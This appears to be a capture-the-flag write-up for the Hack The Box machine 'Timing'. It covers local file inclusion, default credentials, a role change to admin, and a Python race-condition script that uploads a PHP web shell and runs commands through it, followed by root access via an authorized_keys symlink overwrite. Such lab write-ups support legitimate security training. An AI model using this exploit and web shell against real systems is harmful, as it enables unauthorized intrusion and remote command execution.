---
layout: single
title: Timing [boot2root] - Hack The Box
excerpt: "Timing is a fun machine where after network and directory enumeration we discover image.php we fuzz this php file with ffuf and find a ?img= parameter which if we pass /etc/passwd the server tells us “hacking attempt”. If we try it with php://filter with base64 encoding we will have successfully a LFI Vulnerability. Reading the /etc/passwd file the aaron user shows up which we use for login in the web server with default credentials(aaron:aaron). After gaining access to the web server we will see the edit profile menu from which you can get access to admin user. After that a new menu shows up admin panel which allows us to upload an image. After upload we must find the filename with php payload and enumerate to /opt folder which contains a backup file which contains a git repository. Enumerate the folder and we find a git logs which shows the database configuration changes(password for ssh). Login with aaron user name and the password with ssh. At the root part we have access to /usr/bin/netutils as root which allows us to download a file from another server with http and ftp. First create a symbolic link to /root/.ssh/authorized_keys and a new private & public rsa key to the attacking machine. Start a http server from the attacking machine and download it from netutils. That means when the file comes to the timing machine the authorized keys we will overwrite."
date: 2022-1-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-timing/timing-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - boot2root
tags:  
  - local file inclusion
  - custom exploitation
  - enumeration parameters
  - ssh keygen
  - syblolic links
---

<h1 align="center">
<img src="/assets/images/htb-writeup-timing/timing-banner.png">
</h1>

Timing is a fun machine where after network and directory enumeration we discover image.php we fuzz this php file with ffuf and find a ?img= parameter which if we pass /etc/passwd the server tells us “hacking attempt”. If we try it with php://filter with base64 encoding we will have successfully a LFI Vulnerability. Reading the /etc/passwd file the aaron user shows up which we use for login in the web server with default credentials(aaron:aaron). After gaining access to the web server we will see the edit profile menu from which you can get access to admin user. After that a new menu shows up admin panel which allows us to upload an image. After upload we must find the filename with php payload and enumerate to /opt folder which contains a backup file which contains a git repository. Enumerate the folder and we find a git logs which shows the database configuration changes(password for ssh). Login with aaron user name and the password with ssh. At the root part we have access to /usr/bin/netutils as root which allows us to download a file from another server with http and ftp. First create a symbolic link to /root/.ssh/authorized_keys and a new private & public rsa key to the attacking machine. Start a http server from the attacking machine and download it from netutils. That means when the file comes to the timing machine the authorized keys we will overwrite.

## Network Enumeration

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Simple WebApp
|_Requested resource was ./login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds
```


## Directory Enumeartion

```
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/images               (Status: 301) [Size: 309] [--> http://timing.htb/images/]
/login.php            (Status: 200) [Size: 5609]                               
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]                
/image.php            (Status: 200) [Size: 0]                                  
/header.php           (Status: 302) [Size: 0] [--> ./login.php]                
/footer.php           (Status: 200) [Size: 3937]                               
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]                
/css                  (Status: 301) [Size: 306] [--> http://timing.htb/css/]   
/js                   (Status: 301) [Size: 305] [--> http://timing.htb/js/]    
/logout.php           (Status: 302) [Size: 0] [--> ./login.php]  
```

## Fuzz parameters image.php

Fuzzing image.php and find an img parameter which from that we will read other .php files and more. <br><br>
<img src="/assets/images/htb-writeup-timing/fuzzing_parameters.png">


## Identify the user from /etc/passwd using php://filter

Identify the LFI vulnerability but with php://filter because the server not allows us to pass special characters like <b>/../../../</b> Read the /etc/passwd and identify the aaron user.

<img src="/assets/images/htb-writeup-timing/lfi_phpfilter.PNG">

<img src="/assets/images/htb-writeup-timing/aaron_user.PNG">

## Login with aaron for the both box values at login page

Login with aaron user (aaron:aaron)<br><br>
<img src="/assets/images/htb-writeup-timing/login_default_creds.PNG">


## Change user role to admin

When we read the profile_update.php we will see this piece of code which allows us to pass the role=1 parameter and change from user2 to admin. <br><br>
<img src="/assets/images/htb-writeup-timing/rolechange.PNG">

<img src="/assets/images/htb-writeup-timing/change_to_admin.PNG">

<img src="/assets/images/htb-writeup-timing/show_adminpanel.PNG">

## Exploit 

At the exploit part to get the RCE. I create this exploit in python combined with php code which i read it from upload.php with LFI from web server. The upload.php creates a hash and append it in the front of the filename($hash_image.jpg). For the exploit we must to upload and generate at the same to find out the name of the file .

```php
<?php
$upload_dir = "images/uploads/";
$file = "exploit.jpg";

$file_name = md5('$file_hash'. time()) . '_' . $file;
$target_file = $upload_dir . $file_name;
echo $file_name;
echo PHP_EOL;
?>
```

```python
#!/usr/bin/python3
import requests
import os
import time
import threading


#Current URL=http://timing.htb
def upload_post_req():
	burp0_url = "http://timing.htb:80/upload.php"
	burp0_cookies = {"PHPSESSID": "lo4d1l8c8df2b7lgr7vrutethl"} #Change this cookie to our admin cookie
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------358100878512268049331587005052", "Origin": "http://timing.htb", "Connection": "close", "Referer": "http://timing.htb/avatar_uploader.php"}
	burp0_data = "-----------------------------358100878512268049331587005052\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"exploit.jpg\"\r\nContent-Type: txt/php\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------358100878512268049331587005052--\r\n"
	r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
	
def fname_generator():
	print("Running...")
	for i in range(15):
		os.system("php -f fname_generator.php >> output.txt")
		if(i==6):
			threading.Thread(target=upload_post_req).start()
		time.sleep(1)


def response_c(filename):
	VECTOR="http://timing.htb/images/uploads/"
	r=requests.get(VECTOR+str(filename))
	return r.status_code

def injector(filename, cmd):
	VECTOR="http://timing.htb/image.php?img=images/uploads/"
	r=requests.get(VECTOR+filename+"&cmd="+cmd)
	print(r.text)

if __name__ == "__main__":	

	fname_generator()
	
	hash_names=[]
	f = open("output.txt", "r")
	for i in range(15):
		hash_names.append(f.readline().strip("\n"))
	f.close()
	
	for filename in hash_names:
		if str(response_c(filename))=="200":
			os.system("clear")
			print("Success!")
			while(1):
				cmd=input("> ")
				injector(filename, cmd)
				if cmd=="exit":
					break
	
	os.system("rm output.txt")
```

<img src="/assets/images/htb-writeup-timing/run_exploit.png">

<img src="/assets/images/htb-writeup-timing/run_exploit_success.png">


## Download zip backup from /opt folder

Enumerate and download the backup file from opt directory. <br>
<img src="/assets/images/htb-writeup-timing/download_and_unzip.PNG">

## Find git changes and discover aaron ssh password

Find the git changes and login with aaron user to ssh. <Br>
<img src="/assets/images/htb-writeup-timing/git_log_ssh_creds.PNG">

<img src="/assets/images/htb-writeup-timing/login_ssh.PNG">



## Root

At the root part we have perms to run the /usb/bin/netutils with allows us to download a file from http and ftp server. to find out the name of the file <br>
<img src="/assets/images/htb-writeup-timing/sudo_l.PNG">

Example of netutils <br>
<img src="/assets/images/htb-writeup-timing/run_netutils.PNG">

1. Create a symbolic link to /root/.ssh/authorized_keys <br>
2. Create a private and public key in attacking machine. <br>
3. Rename the public key <br>
4. Download the file from timing machine <br>
5. Login from attacking machine with private key to root user.
	<br>
	
	
<img src="/assets/images/htb-writeup-timing/priv_esc.PNG">
